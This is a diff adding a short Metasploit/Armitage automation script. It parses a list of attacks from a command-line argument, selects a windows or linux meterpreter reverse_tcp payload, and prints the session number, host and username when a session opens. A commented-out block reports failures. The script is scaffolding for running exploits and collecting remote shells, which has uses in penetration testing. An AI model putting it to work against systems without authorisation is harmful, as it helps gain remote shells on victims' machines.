@@ -1,0 +1,46 @@
+debug (7 | 24)
+
+on ready {
+
+}
+
+command cmdline_arg {
+   local('$console $attack $payload @attacks');
+   $console = console();
+   @attacks = split('|', $2);
+   
+   println(@attacks);
+   quit();
+}
+
+sub determinePayload {
+   if ($1 == "windows") {
+	return "windows/meterpreter/reverse_tcp";
+   }
+   return "linux/x86/meterpreter/reverse_tcp";
+}
+
+on session_open {
+   local('$flag $host $user $sessionNum %r');
+   %r = $2;
+   $flag = "success";
+   #println("Session open: $1 => $2");
+   $sessionNum = $1;
+   $host = %r["host"];
+   $user = %r["username"];
+   println("$flag" . "," . "$sessionNum" . "," . "$host" . "," . "$user");
+   quit();
+}
+
+#on heartbeat_15s {
+ #  local('$flag $host $user $sessionNum $console @jobid');
+  # $console = console();
+  # $flag = "failure";
+  # $sessionNum = "0";
+ #  $host = "";
+  # $user = "";
+ #  @jobid = job_ids();
+ #  println(@jobid);
+ #  println("$flag" . "," . "$sessionNum" . "," . "$host" . "," . "$user");
+ #  quit();
+#}
